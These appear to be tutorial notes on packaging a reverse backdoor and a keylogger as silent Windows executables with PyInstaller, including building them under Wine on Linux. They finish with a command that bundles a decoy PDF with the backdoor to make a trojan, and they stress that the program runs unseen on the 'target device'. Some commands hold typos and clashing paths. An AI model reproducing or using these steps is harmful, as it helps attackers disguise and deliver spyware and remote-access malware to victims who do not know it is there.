!pip install pyinstaller 

pyinstaller.exe reverse.backdoor.py --onefile --noconsole

#--noconsole lets the program run silently on the target device


all of the above commands work in terminal of windows to convert a file locally in your system 


Now on Linux we can do the same thing by installing windows pyinstaller
and then on terminal write the command 

!wine msiexec /i python-2.7.14.msi 

the above command saves the file in a hidden folder on linux in a virtual space called c drive 

!wine python.exe -m pip install pyinstaller

-----------------------------------------------------------------------------

Now to package our keylogger, which has two files, zlogger and keylogger

first we need to ensure that all the libraries are there in the same dir.

so now on linux

!wine /root/drive_c/python27/python.exe -m pip install pyinput

we just need to package zlogger file, the packager will automatically know that the file depends on the keylogger file

wine /root/.wine/drive_c/Python27/scripts/pyinstaller.exe zlogger.py --onefile --noconsole


While creating a trojan use this command to pack a safe file with the backdoor 

!wine /root/.wine/drive_c/Python277/Scripts/pyinstaller.exe --add-data "/root/Downloads/sample.pdf,. --onefile --noconsole reverse_backdoor.py
